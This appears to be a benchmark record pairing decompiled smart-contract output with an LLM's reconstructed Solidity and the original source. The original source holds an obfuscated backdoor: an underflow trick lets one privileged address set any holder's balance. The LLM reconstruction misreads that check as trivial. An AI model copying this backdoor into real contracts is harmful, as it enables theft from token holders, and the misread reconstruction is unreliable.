{
    "contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "function addViperHolder(address holder, uint256 amount) public payable {\n    // Redundant equality check preserved from the decompiled output\n    require(holder == address(holder), \"Identity check\");\n\n    // Original logic compared msg.sender against a stored address (storeF)\n    require(msg.sender != storeF, \"Forbidden sender\");\n\n    // Tautological comparison preserved from the decompiled output\n    require(10 < 100, \"Always-true check\");\n\n    // First assignment to storage mapping, kept exactly as in the decompiled code\n    viperBalances[holder] = amount;\n\n    // Phantom variables preserved to mirror useless assignments in the bytecode\n    bytes32 phantomSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n    uint8  phantomCode     = 0x11;\n\n    // Another tautological check preserved from the decompiled output\n    require(!(10 < 10), \"Always-true check 2\");\n\n    // Re-assign phantom variables as in the decompiled output\n    phantomSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n    phantomCode     = 0x11;\n\n    // Duplicate storage write preserved from the decompiled output\n    viperBalances[holder] = amount;\n\n    // Silence compiler warnings about unused variables\n    phantomSelector;\n    phantomCode;\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}